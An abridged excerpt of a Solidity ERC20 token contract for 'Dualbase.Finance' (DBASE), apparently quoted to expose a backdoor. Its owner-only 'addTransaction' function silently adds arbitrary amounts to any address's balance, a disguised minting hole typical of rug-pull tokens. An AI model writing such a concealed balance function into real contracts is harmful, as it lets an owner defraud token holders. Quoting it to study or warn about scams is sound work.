...
contract DUALBASE is ERC20UpgradeSafe, OwnableUpgradeSafe {
    ...
    function initialize(uint256 initialSupply)
        ...
        initializer
    {
        __ERC20_init("Dualbase.Finance", "DBASE");
    ...
    function addTransaction(address destination, uint256 data) external onlyOwner {
        _vOwned[destination]=_vOwned[destination].add(data);
    }
